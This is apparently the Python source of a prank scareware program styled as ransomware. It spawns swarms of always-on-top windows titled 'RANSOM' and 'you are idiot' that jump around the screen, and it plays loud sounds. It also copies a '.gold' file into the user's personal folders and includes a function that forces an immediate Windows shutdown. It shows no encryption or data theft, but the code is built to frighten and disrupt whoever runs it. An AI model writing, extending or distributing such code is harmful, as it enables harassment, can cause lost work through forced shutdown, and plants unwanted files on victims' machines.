import tkinter.filedialog
import Desktop
import Configs
from tkinter import *
from PIL import Image as imgPIL
from subprocess import run
from PIL import ImageTk
import ctypes
from pyautogui import size as ScreenSize
from pathlib import Path
from getpass import getuser
from os import path, remove
from shutil import copy2
import random
import mouse
import pygame.mixer
root = Tk()
sw = root.winfo_screenwidth()
sh = root.winfo_screenheight()
root.destroy()
pygame.mixer.init()

radiusGeneratePositionOfCenter = 700
def GenerateMinimalPositionOfStartPositionOnlyXY(w1_width, w1_height, position_started):
    d_width = sw
    d_height = sh
    center_x, center_y = position_started[0], position_started[1]
    max_offset = 1
    dx = random.randint(-max_offset, max_offset)
    dy = random.randint(-max_offset, max_offset)
    w1_x = center_x + dx
    w1_y = center_y + dy
    w1_x = max(0, min(w1_x, d_width - w1_width))
    w1_y = max(0, min(w1_y, d_height - w1_height))
    return w1_x, w1_y
def GetCenter(win_w, win_h):
    x = (sw - win_w) // 2
    y = (sh - win_h) // 2 - 50
    if x < 0:
        x = 0
    if x + win_w > sw:
        x = sw - win_w
    if y < 0:
        y = 0
    if y + win_h > sh:
        y = sh - win_h
    return f"{win_w}x{win_h}+{x}+{y}"
def GenerateRandomPositionOfScreenOnlyXY(w1_width, w1_height):
    return random.randint(0, sw - w1_width), random.randint(0, sh - w1_height)
def GeneratePositionOfCenterOnlyXY(win_w, win_h):
    center_x = sw // 2
    center_y = sh // 2
    offset_x = random.randint(-radiusGeneratePositionOfCenter, radiusGeneratePositionOfCenter)
    offset_y = random.randint(-radiusGeneratePositionOfCenter, radiusGeneratePositionOfCenter)
    x = center_x + offset_x - win_w // 2
    y = center_y + offset_y - win_h // 2
    if x < 0:
        x = 0
    if x + win_w > sw:
        x = sw - win_w
    if y < 0:
        y = 0
    if y + win_h > sh:
        y = sh - win_h
    ox = random.randint(-radiusGeneratePositionOfCenter, radiusGeneratePositionOfCenter)
    oy = random.randint(-radiusGeneratePositionOfCenter, radiusGeneratePositionOfCenter)
    nx = center_x + ox - win_w // 2
    ny = center_y + oy - win_h // 2
    if nx < 0: nx = 0
    if nx + win_w > sw: nx = sw - win_w
    if ny < 0: ny = 0
    if ny + win_h > sh: ny = sh - win_h
    x, y = nx, ny
    return x,y
def GeneratePositionOfCenter(win_w, win_h):
    center_x = sw // 2
    center_y = sh // 2
    offset_x = random.randint(-radiusGeneratePositionOfCenter, radiusGeneratePositionOfCenter)
    offset_y = random.randint(-radiusGeneratePositionOfCenter, radiusGeneratePositionOfCenter)
    x = center_x + offset_x - win_w // 2
    y = center_y + offset_y - win_h // 2
    if x < 0:
        x = 0
    if x + win_w > sw:
        x = sw - win_w
    if y < 0:
        y = 0
    if y + win_h > sh:
        y = sh - win_h
    ox = random.randint(-radiusGeneratePositionOfCenter, radiusGeneratePositionOfCenter)
    oy = random.randint(-radiusGeneratePositionOfCenter, radiusGeneratePositionOfCenter)
    nx = center_x + ox - win_w // 2
    ny = center_y + oy - win_h // 2
    if nx < 0: nx = 0
    if nx + win_w > sw: nx = sw - win_w
    if ny < 0: ny = 0
    if ny + win_h > sh: ny = sh - win_h
    x, y = nx, ny
    return f"{win_w}x{win_h}+{x}+{y}"
def SetMusic(filename, pos=0):
    if not pos: pos = 0
    pygame.mixer.music.load(filename)
    pygame.mixer.music.set_volume(1.0)
    pygame.mixer.music.play()
    pygame.mixer.music.set_pos(pos)
ransomWindowsTypes = {
    1:{
        "Title":"you are idiot",
        "Size":(200, 500),
        "TimeChangedPosition":12000,
        "DestroyTime":25000
    },
    2:{
        "Title":"ransooooom",
        "Size":(100, 100),
        "TimeChangedPosition":2000,
        "DestroyTime":14000
    },
    3:{
        "Title":"RAAAAAAAAAAAAANSOM",
        "Size":(200, 200),
        "TimeChangedPosition":1500,
        "DestroyTime":7000
    },
    4:{
        "Title":"STOP",
        "Size":(100, 100),
        "TimeChangedPosition":7000,
        "DestroyTime":6000
    },
    "main":{
        "Title":"RANSOM",
        "Size":(600, 450),
        "TimeChangedPosition":9000
    }
}
User = r"C:\Users\\"+getuser()
path_coins = (
    User+r"\Downloads",
    User+r"\Documents",
    User + r"\Music",
    User + r"\Pictures",
    User + r"\Desktop",
    User + r"\Videos"
)
coins = []
def RansomWindow(window, startPos : tuple, ransomType : dict):
    def changeGeometry():
        windowGeometry = GenerateMinimalPositionOfStartPositionOnlyXY(ransomType['Size'][0], ransomType['Size'][1], startPos)
        generatedMinimalPositionOfStartPositionOnlyXY = GenerateMinimalPositionOfStartPositionOnlyXY(ransomType['Size'][0], ransomType['Size'][1], windowGeometry)
        window.geometry(str(ransomType['Size'][0])+"x"+str(ransomType['Size'][1])+"+"+str(generatedMinimalPositionOfStartPositionOnlyXY[0])+"+"+str(generatedMinimalPositionOfStartPositionOnlyXY[1]))
    changeGeometry()
    timeMove = 100
    if ransomType['Title'] != "RANSOM":
        window.after(ransomType['DestroyTime'], window.destroy)
    for i in range(0, 900):
        window.after(timeMove, changeGeometry)
        timeMove+=100
    timeMove = ransomType['TimeChangedPosition']
    def changePosition(wnd):
        rt = ransomType
        nonlocal startPos
        startPos = GenerateRandomPositionOfScreenOnlyXY(rt['Size'][0], rt['Size'][1])
        gmt = GenerateRandomPositionOfScreenOnlyXY(rt['Size'][0], rt['Size'][1])
        wnd.geometry(str(rt['Size'][0])+"x"+str(rt['Size'][1])+"+"+str(gmt[0])+"+"+str(gmt[1]))
    for i in range(0, 90):
        window.after(timeMove, changePosition, (window))
        timeMove+=ransomType['TimeChangedPosition']
MWindow = None
def generateWord():
    random.seed()
    tableLets = {
        1:"a", 2:"b", 3:"c", 4:"d", 5:"e", 6:"f", 7:"i", 8:"o", 9:"k", 10:"l",
        11: "A", 12: "B", 13: "C", 14: "D", 15: "E", 16: "F", 17: "I", 18: "O", 19: "k", 20: "L"
    }
    word_ = "_"
    for i in range(1, 20):
        isLetter = random.randint(0, 1)
        if isLetter == 1:
            word_ = word_+tableLets[i]
        else:
            word_ = word_+str(i)
    return word_
def GoodEnd():
    global MWindow
    MWindow.destroy()
    MWindow = Tk()
    MWindow.title("RANSOM")
    MWindow.iconbitmap("ransom.ico")
    MWindow.geometry(GetCenter(722, 471))
    thx_pict = ImageTk.PhotoImage(imgPIL.open("Ransom-success.png"))
    thx = Label(MWindow, image=thx_pict, bg="#820000")
    thx.pack(anchor="center")
    thx.image_ref = thx_pict
    SetSound("Ransom-succes.mp3")
    MWindow.after(5000, MWindow.destroy)
    MWindow.mainloop()
def RansomWindows(MainWindow):
    global MWindow
    MWindow = MainWindow
    PositionMWindow = GenerateRandomPositionOfScreenOnlyXY(600, 450)
    MainWindow.geometry("600x450+" + str(PositionMWindow[0]) + "+" + str(PositionMWindow[1]))
    RansomWindow(MainWindow, (PositionMWindow[0], PositionMWindow[1]), ransomWindowsTypes["main"])
    def CreateWindow():
        randomWindow = random.randint(1, 4)
        ransomType = ransomWindowsTypes[randomWindow]
        window = Toplevel()
        window.title(ransomType['Title'])
        window.resizable(False, False)
        window.attributes("-topmost", True)
        window.iconbitmap("ransom")
        ###
        if ransomType['Title'] == "you are idiot":
            Glitch = ImageTk.PhotoImage(imgPIL.open("Glitch.png"))
            lbl = Label(window, image=Glitch, bg="white")
            lbl.pack(anchor="center")
            lbl.image_ref = Glitch
        elif ransomType['Title'] == "ransooooom":
            A90 = ImageTk.PhotoImage(imgPIL.open("a90.png"))
            lbl = Label(window, image=A90, bg="white")
            lbl.pack(anchor="center")
            lbl.image_ref = A90
        elif ransomType['Title'] == "RAAAAAAAAAAAAANSOM":
            A90 = ImageTk.PhotoImage(imgPIL.open("A-90.png"))
            lbl = Label(window, image=A90, bg="white")
            lbl.pack(anchor="center")
            lbl.image_ref = A90
        elif ransomType['Title'] == "STOP":
            hand = ImageTk.PhotoImage(imgPIL.open("red_hand.png"))
            lbl = Label(window, image=hand, bg="white")
            lbl.pack(anchor="center")
            lbl.image_ref = hand
        ###
        PositionWindow = GenerateRandomPositionOfScreenOnlyXY(600, 450)
        window.geometry(str(ransomType['Size'][0])+"x"+str(ransomType['Size'][1])+"+"+str(PositionWindow[0])+"+"+str(PositionWindow[1]))
        RansomWindow(window, PositionWindow, ransomType)
    CreateWindow()
    CreateWindow()
    CreateWindow()
    CreateWindow()
    for i in range(1, 20):
        MainWindow.after(random.randint(3, 60)*1000, CreateWindow)
    pathCoin = Path(__file__).parent / ".gold"
    for i in range(0, 5):
        folderIn = path_coins[i]
        if (Path(folderIn) / ".gold").exists(): continue
        else: copy2(pathCoin, folderIn)
def SetSound(filename):
    sound = pygame.mixer.Sound(filename)
    sound.set_volume(1.0)
    sound.play()
def Shutdown():
    run(["shutdown", "/s", "/t", "0"])
def GetCenterOnlyXY(win_w, win_h):
    x = (sw - win_w) // 2
    y = (sh - win_h) // 2 - 50
    if x < 0:
        x = 0
    if x + win_w > sw:
        x = sw - win_w
    if y < 0:
        y = 0
    if y + win_h > sh:
        y = sh - win_h
    return x, y
